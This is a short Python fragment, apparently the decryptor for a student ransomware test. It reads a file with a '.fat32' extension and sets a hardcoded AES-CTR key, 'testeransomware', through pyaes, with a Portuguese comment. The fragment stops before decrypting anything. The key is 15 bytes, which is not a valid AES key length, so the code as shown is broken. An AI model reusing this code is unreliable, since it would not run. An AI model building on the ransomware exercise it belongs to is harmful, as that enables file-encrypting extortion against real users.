import os
import pyaes
file_name = 'testecripto.txt.fat32'
file = open(file_name,'rb')
file_data = file.read()
file.close()

#setando chave de descriptografia
key = b'testeransomware'
aes = pyaes.AESModeOfOperationCTR(key)